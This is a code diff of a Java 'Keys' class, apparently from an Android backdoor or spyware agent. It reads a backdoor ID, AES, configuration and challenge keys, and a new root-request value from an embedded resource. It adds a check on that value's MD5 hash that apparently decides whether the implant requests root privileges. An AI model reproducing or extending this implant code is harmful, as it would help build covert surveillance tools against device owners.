@@ -34,7 +34,8 @@ public class Keys {
 
 	// Subversion
 	/** The Constant g_Subtype. */
-	//private static final byte[] subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };
+	// private static final byte[] subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D'
+	// };
 	// private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I',
 	// 'D' };
 
@@ -60,6 +61,9 @@ public class Keys {
 
 	// Demo key
 	private static byte[] demoMode;
+
+	// Privilege key
+	private static byte[] rootRequest;
 
 	/**
 	 * Self.
@@ -117,13 +121,15 @@ public class Keys {
 
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
 
-			// Richiediamo 16 byte ma incrementiamo di 32, e' corretto cosi perche'
+			// Richiediamo 16 byte ma incrementiamo di 32, e' corretto cosi
+			// perche'
 			// ci servono solo 16 byte
-			backdoorId = Utils.copy(resource, 0, 14);    // 14 byte
-			aesKey = Utils.copy(resource, 14, 16);       // 16 byte
-			confKey = Utils.copy(resource, 46, 16);		 // 16 byte
+			backdoorId = Utils.copy(resource, 0, 14); // 14 byte
+			aesKey = Utils.copy(resource, 14, 16); // 16 byte
+			confKey = Utils.copy(resource, 46, 16); // 16 byte
 			challengeKey = Utils.copy(resource, 78, 16); // 16 byte
-			demoMode = Utils.copy(resource, 110, 24);	 // 24 byte
+			demoMode = Utils.copy(resource, 110, 24); // 24 byte
+			rootRequest = Utils.copy(resource, 134, 16); // 16 byte
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
@@ -132,11 +138,13 @@ public class Keys {
 				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey));//$NON-NLS-1$
 				Check.log(TAG + " instanceId: " + Utils.byteArrayToHex(instanceId));//$NON-NLS-1$
 				Check.log(TAG + " demoMode: " + Utils.byteArrayToHex(demoMode));//$NON-NLS-1$
+				Check.log(TAG + " rootMode: " + Utils.byteArrayToHex(rootRequest));//$NON-NLS-1$
 			}
 
 			if (isDemo()) {
 				Cfg.DEMO = true;
 			}
+					
 		}
 	}
 
@@ -154,6 +162,27 @@ public class Keys {
 		}
 
 		return ret;
+	}
+
+	public boolean wantsPrivilege() {
+		byte[] rootDigest = new byte[] { (byte) 0x3e, (byte) 0x96, (byte) 0xb7, (byte) 0x82, (byte) 0x7e, (byte) 0x89,
+				(byte) 0xda, (byte) 0xbc, (byte) 0xb5, (byte) 0x6c, (byte) 0xd3, (byte) 0x34, (byte) 0xfb, (byte) 0x70,
+				(byte) 0xb8, (byte) 0xba };
+
+		byte[] calculated = Digest.MD5(getRootRequest());
+
+		boolean ret = Arrays.equals(calculated, rootDigest);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (wantsPrivilege MD5): " + Utils.byteArrayToHex(calculated)); //$NON-NLS-1$
+			Check.log(TAG + " (wantsPrivilege): " + ret); //$NON-NLS-1$
+		}
+
+		return ret;
+	}
+
+	protected byte[] getRootRequest() {
+		return rootRequest;
 	}
 
 	/**
@@ -217,10 +246,10 @@ public class Keys {
 	 * @return the subtype
 	 */
 	public byte[] getSubtype() {
-		if(Cfg.DEMO){
-			//20.1=DEMO
+		if (Cfg.DEMO) {
+			// 20.1=DEMO
 			return ("ANDROID-" + Messages.getString("20.1")).getBytes();
-		}else{
+		} else {
 			return "ANDROID".getBytes();
 		}
 	}
